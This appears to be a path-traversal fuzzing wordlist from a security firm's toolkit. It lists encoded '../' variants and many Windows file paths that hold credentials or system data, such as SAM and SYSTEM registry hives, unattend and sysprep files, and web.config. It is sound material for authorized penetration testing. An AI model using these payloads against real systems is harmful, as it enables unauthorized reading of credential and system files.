<!---------------------------------------------------------------------------------
Copyright: (c) BLS OPS LLC.
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, version 3.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.
--------------------------------------------------------------------------------->
# Windows filename fuzzing

## Encoded directory traversal strings

```
../
..\
..\/
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
..././
...\.\
```

## Filename fuzzing strings
```
\inetpub\logs\logfiles\w3svc1\u_ex[yymmdd].log
\$recycle.bin\s-1-5-18\desktop.ini
\boot.ini
\documents and settings\administrator\desktop\desktop.ini
\documents and settings\administrator\ntuser.dat
\documents and settings\administrator\ntuser.ini
\inetpub\logs\logfiles
\inetpub\wwwroot\global.asa
\inetpub\wwwroot\index.asp
\inetpub\wwwroot\web.config
\log\access.log
\log\access_log
\log\error.log
\log\error_log
\log\httpd\access_log
\log\httpd\error_log
\logs\access.log
\logs\access_log
\logs\error.log
\logs\error_log
\logs\httpd\access_log
\logs\httpd\error_log
\minint\smsosd\osdlogs\variables.dat
\sysprep.inf
\sysprep\sysprep.inf
\sysprep\sysprep.xml
\sysprep.xml
\system32\inetsrv\metabase.xml
\system volume information\wpsettings.dat
\unattended.txt
\unattended.xml
\unattend.txt
\unattend.xml
\users\administrator\desktop\desktop.ini
\users\administrator\ntuser.dat
\users\administrator\ntuser.ini
\windows\csc\v2.0.6\pq
\windows\csc\v2.0.6\sm
\windows\debug\netsetup.log
\windows\explorer.exe
\windows\iis5.log
\windows\iis6.log
\windows\iis7.log
\windows\iis8.log
\windows\iis6.log
\windows\iis10.log
\windows\notepad.exe
\windows\panther\setupinfo
\windows\panther\setupinfo.bak
\windows\panther\sysprep.inf
\windows\panther\sysprep.xml
\windows\panther\unattended.txt
\windows\panther\unattended.xml
\windows\panther\unattend\setupinfo
\windows\panther\unattend\setupinfo.bak
\windows\panther\unattend\sysprep.inf
\windows\panther\unattend\sysprep.xml
\windows\panther\unattend.txt
\windows\panther\unattend\unattended.txt
\windows\panther\unattend\unattended.xml
\windows\panther\unattend\unattend.txt
\windows\panther\unattend\unattend.xml
\windows\panther\unattend.xml
\windows\repair\sam
\windows\repair\security
\windows\repair\software
\windows\repair\system
\windows\system32\config\appevent.evt
\windows\system32\config\default.sav
\windows\system32\config\regback\default
\windows\system32\config\regback\sam
\windows\system32\config\regback\security
\windows\system32\config\regback\software
\windows\system32\config\regback\system
\windows\system32\config\sam
\windows\system32\config\secevent.evt
\windows\system32\config\security.sav
\windows\system32\config\software.sav
\windows\system32\config\system
\windows\system32\config\system.sa
\windows\system32\config\system.sav
\windows\system32\drivers\etc\hosts
\windows\system32\eula.txt
\windows\system32\inetsrv\config\applicationhost.config
\windows\system32\inetsrv\config\schema\aspnet_schema.xml
\windows\system32\license.rtf
\windows\system32\logfiles\httperr\httperr1.log
\windows\system32\sysprep.inf
\windows\system32\sysprep\sysprep.inf
\windows\system32\sysprep\sysprep.xml
\windows\system32\sysprep\unattended.txt
\windows\system32\sysprep\unattended.xml
\windows\system32\sysprep\unattend.txt
\windows\system32\sysprep\unattend.xml
\windows\system32\sysprep.xml
\windows\system32\unattended.txt
\windows\system32\unattended.xml
\windows\system32\unattend.txt
\windows\system32\unattend.xml
\windows\system.ini
\windows\windowsupdate.log
\windows\win.ini
\winnt\win.ini
```